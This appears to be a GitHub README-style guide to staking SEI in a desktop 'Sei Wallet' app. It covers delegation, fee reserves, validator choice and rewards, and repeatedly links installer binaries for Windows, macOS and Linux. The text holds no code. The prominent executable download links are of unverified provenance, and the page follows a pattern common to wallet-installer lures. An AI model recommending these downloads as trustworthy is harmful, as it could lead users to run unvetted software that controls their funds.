![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">How to stake SEI in Sei Wallet</h1>

<p align="center">Delegate from the app, keep a liquid reserve, and pick a validator on evidence.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Staking SEI means delegating it to a validator who produces blocks on your behalf. The coins stay yours — they move from "liquid" to "bonded" inside your own account, not to the validator — but they stop being spendable, and getting them back takes an unbonding period rather than a click.

Sei Wallet has staking built in, so the whole flow happens in one application: pick a validator, choose an amount, confirm, and watch rewards accrue. The parts worth understanding before you start are the reserve you must leave behind and the timing of an exit.

## What staking does and does not do

**It does not hand over your coins.** Delegation is a state change in your own account. The validator cannot move, spend or seize your delegation; if the validator misbehaves, the protocol can penalise the stake, which is the risk you are accepting.

**It does not lock you forever.** Unbonding is a delay, not a refusal. You can start an exit at any time and receive the balance when the period ends.

**No return is fixed.** Rewards depend on network conditions and validator performance. Anyone quoting you a fixed percentage is describing the past, not a promise.

## Before you stake: leave yourself gas

This is the trap that catches people who stake everything. Once your entire balance is bonded, you have no liquid SEI to pay the fee for the unbonding transaction. The position is not lost, but you cannot move until SEI arrives at that address from somewhere else — and asking strangers for a small transfer is how people meet scammers.

Leave a small liquid balance — a few SEI is plenty. Think of it as the fare for your own exit: without it, the unstake button has nothing to spend, and the wait begins before the waiting period does. The full failure mode, including what to do if it has already happened, is in [unstaking and the unbonding period](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md).

## The steps

1. Open the staking section of the app and choose the account you want to stake from. Confirm the address before continuing.
2. Pick a validator. The app lists them with the information it has; see the next section for how to choose.
3. Enter an amount, leaving a liquid reserve for fees.
4. Confirm the transaction. With a hardware wallet attached, this is where the device asks you to approve.
5. Check that the position appears as bonded, with the validator's name attached.

Nothing leaves the wallet during any of this beyond the network fee. If an interface ever asks you to send SEI to an address to "activate staking", that is not staking.

## How to choose a validator

There is no single right answer, but four things are worth checking:

- **Commission.** A validator takes a cut of rewards. Low is not automatically better; a rate that is unsustainable tends to rise later.
- **Uptime and history.** A validator that misses blocks earns less for its delegators. Prefer a track record over a marketing page.
- **Concentration.** Delegating to a validator that already holds a large share of the network makes the network less decentralised. Spreading stake across several validators is a reasonable default.
- **Identity and contactability.** A validator that publishes who it is and how to reach it is easier to evaluate than an anonymous one.

None of this requires trusting a claim made in a chat message. Validators do not need to contact you, and any message offering to "help you stake" is a scam pattern regardless of how official it looks — the safety basics are in [is Sei Wallet safe](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).

## Watching rewards

Rewards accrue to the bonded position and usually need to be claimed before they become liquid. A claimed reward does not create a new position; it increases your available balance. That distinction explains most "my rewards disappeared" confusion, which is covered in [staking rewards not showing](https://github.com/sei-chain/sei-wallet-staking/blob/main/rewards-not-showing-up.md).

Rewards are denominated in the smallest unit of SEI, so a figure like `0.004` may be displayed as a much larger integer in some views. That is a denomination, not a windfall. The unit convention is the same one described in [the address-format guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) — one chain, more than one representation.

## Redelegating versus unstaking

If you want to move stake from one validator to another, redelegation is usually the right tool: it is immediate and keeps the position bonded. Unstaking is for when you want the coins liquid again, and it starts the unbonding clock.

Redelegation is not unlimited — there are rules about how often and how much can move at once. The constraints and the unbonding timing belong together, and both are covered in the unstaking guide.

## Staking with a hardware wallet

If your Ledger is connected, staking works the same way with one extra confirmation per transaction on the device. That confirmation is the point: the device shows what you are about to sign, and you should read it rather than approve by reflex.

## If you would rather not run a desktop app

Staking through MetaMask is not possible — it has no delegation feature on any chain — so the alternative is another wallet with staking support rather than a browser extension trick. The comparison of what each route gives you is in [adding Sei to MetaMask instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md), and the wider picture of what the desktop app does is in [the wallet overview](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Frequently asked questions

**Where can I stake SEI?** In any wallet that supports Sei delegation, including this one. Staking is a chain-level action, not something a single app owns.

**Can you stake SEI?** Yes. Delegation is open to any holder; the constraints are the unbonding period and the liquid reserve you keep for fees.

**Is there a minimum?** Any amount above the transaction fee can be delegated, but tiny amounts are dominated by fees. Check the current fee in the app before delegating a small balance.

**Do I keep custody while staked?** Yes. The delegation sits in your account; the validator has no ability to move it.

**What happens if my validator goes offline?** Your stake stays yours, but rewards stop while it is down and repeated downtime can be penalised. This is why validator choice is a real decision rather than a formality.

**Can I unstake immediately?** You can start the unbonding at any time. Liquidity returns at the end of the unbonding period; the click only starts the clock.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Unstaking SEI in Sei Wallet: the unbonding wait and stuck unstakes](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [Staking rewards not showing in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/rewards-not-showing-up.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
